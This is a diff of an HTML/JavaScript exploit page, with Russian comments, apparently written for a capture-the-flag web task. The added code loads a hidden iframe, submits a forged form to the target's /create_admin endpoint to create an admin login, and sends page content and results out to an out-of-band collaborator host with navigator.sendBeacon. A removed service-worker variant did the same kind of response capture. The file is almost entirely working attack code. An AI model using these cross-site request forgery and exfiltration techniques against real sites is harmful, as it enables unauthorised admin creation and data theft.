@@ -5,41 +5,43 @@
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Регистрируем service worker
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js').then(registration => {
-        console.log('Service Worker registered');
-        
-        // Отправляем форму через service worker
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = TARGET + '/create_admin';
-        form.innerHTML = '<input name="new_admin_login" value="SERVICE_WORKER_TEST">';
-        document.body.appendChild(form);
-        form.submit();
-    });
-}
+// Попробуем получить ответ через onerror/onload
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
 
-// sw.js должен быть на твоём сервере:
-// self.addEventListener('fetch', event => {
-//     if (event.request.url.includes('create_admin')) {
-//         event.respondWith(
-//             fetch(event.request).then(response => {
-//                 // Клонируем response чтобы прочитать
-//                 const cloned = response.clone();
-//                 cloned.text().then(text => {
-//                     // Отправляем на коллаборатор
-//                     fetch('https://COLLAB/capture', {
-//                         method: 'POST',
-//                         mode: 'no-cors',
-//                         body: text
-//                     });
-//                 });
-//                 return response;
-//             })
-//         );
-//     }
-// });
+// Пробуем загрузить ответ как HTML
+iframe.src = TARGET + '/create_admin'; // GET запрос
+
+iframe.onload = function() {
+    setTimeout(() => {
+        try {
+            // Может быть доступ через contentWindow.document?
+            const content = iframe.contentWindow.document.body.innerHTML;
+            navigator.sendBeacon(COLLAB + '/iframe_load', content.substring(0, 1000));
+        } catch(e) {
+            // Пробуем через name
+            iframe.name = 'test';
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = TARGET + '/create_admin';
+            form.target = 'test';
+            form.innerHTML = '<input name="new_admin_login" value="IFRAME_TEST">';
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Через 3 секунды проверяем имя iframe
+            setTimeout(() => {
+                navigator.sendBeacon(COLLAB + '/iframe_name', iframe.contentWindow.name);
+            }, 3000);
+        }
+    }, 1000);
+};
+
+iframe.onerror = function() {
+    navigator.sendBeacon(COLLAB + '/iframe_error', 'error_loading');
+};
+
+document.body.appendChild(iframe);
 </script>
 </body>
 </html>
